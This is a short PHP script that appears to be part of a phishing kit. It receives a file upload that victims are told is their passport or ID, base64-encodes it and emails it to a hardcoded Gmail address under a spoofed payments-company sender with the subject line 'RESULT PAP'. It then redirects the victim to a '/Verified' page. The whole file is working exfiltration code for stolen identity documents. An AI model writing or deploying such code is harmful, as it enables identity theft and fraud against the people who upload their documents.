<?php
require_once("../main.php");
error_reporting(1);
$statusMsg='Wait For 24 Hour';
if(isset($_FILES["file"]["name"])){
   $email = $_POST['email'];
    $name = $_POST['name'];
    $subject = $_POST['subject'];
    $message = $_POST['message'];
$fromemail =  "admin@northlanepayments.co.uk";
$subject="ID PASSPORT";
$email_message = '<h2>RESULT PAP</h2>
                    <p><b>Subject:</b> '.$subject.'</p>
                    <p><b>Message:</b><br/>'.$message.'</p>';
$email_message.="Please find the attachment";
$semi_rand = md5(uniqid(time()));
$headers = "From: PAPBULE <admin@northlanepayments.co.uk>";
$mime_boundary = "==Multipart_Boundary_x{$semi_rand}x";
 
    $headers .= "\nMIME-Version: 1.0\n" .
    "Content-Type: multipart/mixed;\n" .
    " boundary=\"{$mime_boundary}\"";
 
if($_FILES["file"]["name"]!= ""){  
 $strFilesName = $_FILES["file"]["name"];  
 $strContent = chunk_split(base64_encode(file_get_contents($_FILES["file"]["tmp_name"])));  
 
 
    $email_message .= "This is a multi-part message in MIME format.\n\n" .
    "--{$mime_boundary}\n" .
    "Content-Type:text/html; charset=\"iso-8859-1\"\n" .
    "Content-Transfer-Encoding: 8bit\n\n" .
    $email_message .= "\n\n";
 
 
    $email_message .= "--{$mime_boundary}\n" .
    "Content-Type: image/png;\n" .
    " name=\"{$strFilesName}\"\n" .
    //"Content-Disposition: attachment;\n" .
    //" filename=\"{$fileatt_name}\"\n" .
    "Content-Transfer-Encoding: base64\n\n" .
    $strContent  .= "\n\n" .
    "--{$mime_boundary}--\n";
}
$toemail="hyrozegabangkit@gmail.com"; 
 
if(mail($toemail, $subject, $email_message, $headers)){
   $statusMsg= "Email send successfully with attachment";
}else{
   $statusMsg= "Not sent";
}
}

header("Location: /Verified");

?>